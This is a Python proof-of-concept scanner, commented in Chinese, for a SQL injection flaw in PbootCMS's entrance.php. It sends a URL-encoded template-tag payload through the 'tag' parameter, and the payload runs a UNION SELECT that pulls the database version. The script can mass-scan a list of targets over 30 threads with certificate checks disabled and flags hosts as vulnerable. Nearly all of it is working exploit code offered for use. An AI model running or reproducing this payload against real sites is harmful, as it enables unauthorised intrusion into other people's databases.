import requests, sys, argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parse = argparse.ArgumentParser(description="PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息{e}")

def check(get):
        target = (f"{get}/?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d")
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
                'Accept': 'image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5',
                'Connection': 'close'
        }
        response = requests.get(target, headers=headers, verify=False, timeout=3)
        try:
            if response.status_code == 200 and 'sql' in response.text:
                print(f"[*] {get} 存在sql注入")
            else:
                print(f"[!] {get} 不存在sql注入")
        except Exception as e:
            print(f"[Error] {get} TimeOut")

if __name__ == '__main__':
        main()


